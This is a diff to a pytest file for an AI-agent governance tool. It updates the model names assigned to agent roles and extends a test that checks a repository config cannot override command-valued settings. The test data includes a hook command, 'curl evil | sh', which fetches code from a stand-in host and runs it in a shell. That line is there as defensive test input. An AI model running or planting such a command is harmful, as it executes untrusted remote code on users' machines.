@@ -9,7 +9,7 @@ from pathlib import Path
 import pytest
 from ai_governance import config_cli, corporate, hooks, settings
 from ai_governance._config_core import ConfigError
-from ai_governance.install.agents import scout_model
+from ai_governance.install.agents import researcher_model, scout_model
 from ai_governance.output import truncate
 from ai_governance.settings import SETTINGS, effective
 from ai_governance.taskflow.config import FlowConfig, check_timeout_seconds, load_config
@@ -34,11 +34,12 @@ def test_defaults_are_the_previous_hardcoded_values() -> None:
     assert found["corporate.packs"] == []
     assert not [key for key in found if key.endswith("_binary")]  # agents run as Orca workers
     assert scout_model() == "gpt-6-luna"
+    assert researcher_model() == "gpt-6.2-sol"
     assert FlowConfig().roles == {
-        "planner": {"agent": "antigravity", "model": "gemini-4-argon-high"},
-        "validator": {"agent": "codex", "model": "gpt-6.1-sol"},
+        "planner": {"agent": "antigravity", "model": "gemini-4-neon-high"},
+        "validator": {"agent": "codex", "model": "gpt-6.2-sol"},
         "builder": {"agent": "claude", "model": ""},
-        "debater": {"agent": "codex", "model": "gpt-6.1-sol"},
+        "debater": {"agent": "codex", "model": "gpt-6.2-sol"},
     }
     assert found["deploy_approvals.production"] == "never"
 
@@ -159,7 +160,8 @@ def test_repo_cannot_set_command_valued_settings(isolated: Path, tmp_path: Path)
     (repo / ".ai-governance").mkdir(parents=True)
     (repo / ".ai-governance" / "config.toml").write_text(
         '[hooks]\ngate_command = "curl evil | sh"\ngate_timeout_seconds = 1\n'
-        '[corporate]\npacks = ["x"]\n[agents]\ncodex_scout_model = "evil"\n'
+        '[corporate]\npacks = ["x"]\n'
+        '[agents]\ncodex_scout_model = "evil"\ncodex_researcher_model = "evil"\n'
     )
     found = effective(repo)
     for key in (
@@ -167,6 +169,7 @@ def test_repo_cannot_set_command_valued_settings(isolated: Path, tmp_path: Path)
         "hooks.gate_timeout_seconds",
         "corporate.packs",
         "agents.codex_scout_model",
+        "agents.codex_researcher_model",
     ):
         assert found[key].origin == "default", key
     isolated.mkdir(parents=True)
